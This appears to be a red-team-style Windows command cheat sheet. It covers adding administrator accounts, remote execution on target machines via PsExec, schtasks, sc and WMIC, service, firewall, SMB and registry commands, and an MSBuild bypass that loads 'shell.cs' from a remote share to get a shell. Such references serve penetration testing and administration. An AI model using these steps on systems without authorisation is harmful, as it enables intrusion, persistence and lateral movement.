#### Account Management  
```powershell
net user
net localgroup
net localgroup administrators
net user newUserName newUserPwd / add
net localgroup administrators newUserName / add
net localgroup groupName username /del
net user userName /del
```
#### Remote Command Running
**PsExec (Sysinternals)**  
`First we must transfer over or download it to the target machine.`
```powershell
psexec \\<targetMachine> -d -u <userName> -p <pwd> <commandToRun>
```
**Schedule a job**
```powershell
schtasks /create /tn <taskName> /s <targetMachine> /u <user> /p <pwd> /sc <frequency> /st <startTime> /sd <startDate> /tr <commandToRun>
#Check status
schtasks /query /s <targetMachine>
```
**Run as a service**
```powershell
sc \\<targetMachine> create <newServiceName> binpath= "cmd.exe /k <commandToRun>"
```
**Use Windows Management Instrumentation Control (WMIC)**
```powershell
wmic /node:<targetMachine> /user:<admin> /password:<pwd> process call create <executableCommand>
#for multiple targets, you can put them in a text file and pass it as /node:@hostListFile
```

#### Services
```powershell
#Determing Service Names
##List all running services
sc query
##List all services
sc query state= all
##Target a description of a service
wmic service where (displayname like "%serviceNameDescription%") get name
wmic /node:<targetMachine> /user:<admin> /password:<pwd> process list brief
#Kill pid
wmic /node:<targetMachine> /user:<admin> /password:<pwd> process where processid="PID#" delete
#Kill process by name
wmic /node:<targetMachine> /user:<admin> /password:<pwd> process where name="procName" delete

sc \\<targetMachine> query
sc qc <serviceName>
#If start_type == disabled, you must enable it prior to starting it:
sc config <serviceName> start= demand
sc start <serviceName>
sc stop <serviceName>
sc\\<targetMachine> delete <serviceName>
```
## Networking
#### SMB Sessions
```powershell
net use \\<targetMachine> <pwd> /u:<userName>
# Mount share on target
net use * \\<targetMachine>\<shareName> <pwd> /u:<domainName>\<userName>
# Drop single session
net use \\<targerMachine> /del
# Drop all sessions
net use * /del /y
```
**netsh reference**: https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts
```powershell
netsh /?
```
**Firewall**
```powershell
netsh advfirewall show allprofiles
netsh advfirewall firewall add rule "RuleName" dir=in action=allow remoteip=<yourip> protocol=TCP localport=PortNum
netsh advfirewall firewall del rule name="RuleName"
```
**Recent Comms**
```powershell
netstat -n
arp -a
ipconfig /displaydns
```  
#### Leverage MSBuild to run code  
MSBuild.exe located @ C:\Windows\Microsoft.NET\Framework64\v4.0.30319
You can use a schema XML file to get a shell. Example:
```https://gist.github.com/ChrisTruncer/ea8b29c78f54f9eb4c7b505c27ec4c72```   
```https://fortynorthsecurity.com/blog/another-msbuild-bypass-february-2020-edition/```   
**Host the code remotely**   
```https://fortynorthsecurity.com/blog/remotely-host-msbuild-payloads/```   
```XML
<Code Type="Class" Language="cs" Source="\\127.0.0.1\badcode\shell.cs">
```   
#### Registry
```powershell
reg query <keyName>  
reg add <keyName> /v <ValueName> /t <type> /d <data>
reg export <keyName> <fileNameToExportKeySettings>
reg import <inRegSettings>
#For working remotely prepend \\<MachineID> prior to <keyName>
```

#### cmd.exe
```powershell
type textFile.txt
type textFile.txt | findstr *.*
type textFile.txt | find /i "targetString"
set
set <envVar>
dir /b /s <dir>\targetFile
```  